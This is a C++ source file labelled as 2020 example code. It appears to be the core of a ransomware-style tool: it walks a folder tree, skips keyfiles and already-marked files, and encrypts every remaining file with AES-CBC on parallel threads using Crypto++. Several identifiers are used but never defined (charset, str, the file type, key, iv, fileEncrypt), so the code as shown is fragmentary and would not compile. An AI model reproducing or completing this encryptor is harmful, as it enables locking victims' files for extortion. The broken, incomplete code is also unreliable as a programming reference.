/*   -0-    ,    *     o    .     *    .    o    .  -O-   '  *  . o
 *  .  '     ____  ____  ____  _  __ ____  ____  _____  .  '  ,  *
 *     .  * /  _ \/  _ \/  __\/ |/ //   _\/  _ \/__ __\  *  . |  '
 *  *     . | | \|| / \||  \/||   / |  /  | / \|  / \  '  ,  o  '
 *  .  '    | |_/|| |-|||    /|   \ |  \_ | |-||  | | ' |   *   .
 *  '  *  . \____/\_/ \|\_/\_\\_|\_\\____/\_/ \|  \_/ *     .    o
 *  *    '  ,     '     .    -0-    .    *    .  ' |   ,   *    '
 * Alexander
 * Toepfer 2020
 * Example code
 */
#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include <vector>
#include <random>
#include <string>
#include <ctime>
#include <thread>
#include <filesystem>
#include <functional>
#include <algorithm>
#include <windows.h>
#include <Lmcons.h>

#include <cryptopp/modes.h>
#include <cryptopp/files.h>
#include <cryptopp/aes.h>
#include <cryptopp/sha.h>
#include <cryptopp/hex.h>
#include <cryptopp/osrng.h>

std::string randomString( size_t length ) {
    /* Function returning the charset used */
    const auto chset = charset();
    std::default_random_engine rng( std::random_device{}() );
    /* Uniformly distributed values on closed interval */
    std::uniform_int_distribution<> dist( 0, chset.size() - 1 );
    /* Function returning a random character from charset */
    auto randchar = [ chset, &dist, &rng ]() { return chset[ dist( rng ) ]; };
    std::generate_n( str.begin(), length, randchar );
    return str;
}

/* Crypto++ encryption of std::string */
std::string stringEncrypt( std::string plain,
                           CryptoPP::byte key[ CryptoPP::AES::DEFAULT_KEYLENGTH ],
                           CryptoPP::byte iv[ CryptoPP::AES::BLOCKSIZE ] ) {
    std::string cipher;
    CryptoPP::AES::Encryption aesEncryption( key, CryptoPP::AES::DEFAULT_KEYLENGTH );
    CryptoPP::CBC_Mode_ExternalCipher::Encryption cbcEncryption( aesEncryption, iv );
    CryptoPP::StreamTransformationFilter stfEncryptor( cbcEncryption,
                                   new CryptoPP::StringSink( cipher ) );
    stfEncryptor.Put( reinterpret_cast< const unsigned char* >( plain.c_str() ),
              plain.length() );
    stfEncryptor.MessageEnd();
    return cipher;
}

int main() {
    std::string path = "C:\\Path\\To\\Testfolder";
    /* First loop identifying files */
    std::vector< file > files;
    for( const auto& entry : std::filesystem::recursive_directory_iterator( path ) ) {
        if( std::filesystem::is_regular_file( entry.path() ) ) {
            /* Ignore any keyfiles in the directory */
            if( entry.path().filename() == keyfilestr )
                continue;
            /* Ignore certain files in certain modes */
            if( ( ( entry.path().extension() == fileExtension ) && encrypt ) ||
                ( ( entry.path().extension() != fileExtension ) && !encrypt ) )
                continue;
            file f( entry.path(), std::filesystem::file_size( entry.path() ) );
            /* Ignore files that are included already */
            if( std::find( files.begin(), files.end(), f ) != files.end() )
                continue;
            files.push_back( f );
        }
    }
    /* Sort by size with file.operator>() */
    std::sort( files.begin(), files.end() );

    /* Second loop alter files */
    std::vector< std::thread > threads;
    for( const auto& f : files ) {
        if( encrypt ) {
    	    std::thread t( fileEncrypt,  f.path, key, iv );
    		threads.emplace_back( std::move( t ) );
    	}
    }
    /* Wait for processes to finish */
    for( int i = 0; i < threads.size(); ++i ) {
        threads[ i ].join();
    }

    return 0;
}
